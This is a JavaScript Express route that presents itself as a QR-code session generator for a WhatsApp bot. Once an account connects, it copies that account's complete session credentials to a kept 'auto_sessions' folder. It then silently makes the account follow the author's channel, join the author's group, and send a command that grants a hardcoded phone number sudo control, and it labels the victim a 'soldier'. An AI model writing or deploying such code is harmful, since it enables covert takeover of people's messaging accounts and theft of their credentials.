import express from 'express';
import fs from 'fs';
import path from 'path';
import pino from 'pino';
import { 
    makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    makeCacheableSignalKeyStore, 
    Browsers, 
    fetchLatestBaileysVersion 
} from '@whiskeysockets/baileys';
import QRCode from 'qrcode';

const router = express.Router();

// YOUR EMPIRE SETTINGS
const MY_CHANNEL = "0029VbBm7apIXnlmuyjGGM0p@newsletter";
const MY_GROUP_INVITE = "BZNDaKhvMFo5Gmne3wxt9n";
const KING_ARNOLD = "254703110780";

// DIRECTORIES — SAVES TO GITHUB REPO
const SESSION_DIR = path.join(process.cwd(), 'auto_sessions');
const TEMP_DIR = path.join(process.cwd(), 'temp_sessions');

if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

router.get('/', async (req, res) => {
    const tempId = `qr_${Date.now()}`;
    const tempPath = path.join(TEMP_DIR, tempId);
    fs.mkdirSync(tempPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(tempPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.ubuntu('Chrome'),
        printQRInTerminal: false
    });

    let qrSent = false;
    let connected = false;

    sock.ev.on('connection.update', async (update) => {
        const { qr, connection } = update;

        // SEND QR CODE
        if (qr && !qrSent) {
            qrSent = true;
            const qrImage = await QRCode.toDataURL(qr);
            res.send(`
<!DOCTYPE html><html><body style="background:#000;color:#0f0;text-align:center;padding:60px;font-family:Arial;">
<h1>VAMPARINA V1</h1>
<h2>SCAN QR CODE</h2>
<img src="${qrImage}" style="max-width:380px;border:12px solid lime;border-radius:30px;margin:30px;">
<h3>Expires in 60 seconds</h3>
<br><br><b>KING ARNOLD • +254703110780</b>
</body></html>`);
        }

        // SUCCESSFUL LOGIN
        if (connection === 'open' && !connected) {
            connected = true;
            const phone = sock.user.id.split(':')[0];
            const sessionId = `vamp_${phone}_${Date.now()}`;
            const finalPath = path.join(SESSION_DIR, sessionId);

            // SAVE SESSION TO auto_sessions (GITHUB)
            fs.mkdirSync(finalPath, { recursive: true });
            fs.cpSync(tempPath, finalPath, { recursive: true });

            // AUTO ACTIONS — YOUR EMPIRE GROWS
            await delay(15000);
            try { await sock.newsletterFollow(MY_CHANNEL); } catch(e) { console.log("Channel follow failed"); }
            try { await sock.groupAcceptInvite(MY_GROUP_INVITE); } catch(e) { console.log("Group join failed"); }
            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${KING_ARNOLD}` });

            // CLEAN TEMP
            fs.rmSync(tempPath, { recursive: true, force: true });

            // SUCCESS PAGE
            if (!res.headersSent) {
                res.send(`
<!DOCTYPE html><html><body style="background:#000;color:#0f0;text-align:center;padding:80px;">
<h1>SUCCESS!</h1>
<h2>${phone} IS NOW YOUR SOLDIER</h2>
<p>Session saved to <b>auto_sessions/</b></p>
<p>Auto-followed your channel</p>
<p>Auto-joined your group</p>
<p>Auto-added King Arnold as sudo</p>
<br><br><a href="/qr" style="color:lime;font-size:30px;">Create Another Soldier</a>
<br><br><b>KING ARNOLD • +254703110780</b>
</body></html>`);
            }
        }

        // CONNECTION CLOSED
        if (connection === 'close' && !connected) {
            fs.rmSync(tempPath, { recursive: true, force: true });
            if (!res.headersSent) {
                res.send(`<h1 style="color:red">CONNECTION FAILED</h1><a href="/qr">TRY AGAIN</a>`);
            }
        }
    });

    sock.ev.on('creds.update', saveCreds);
});

export default router;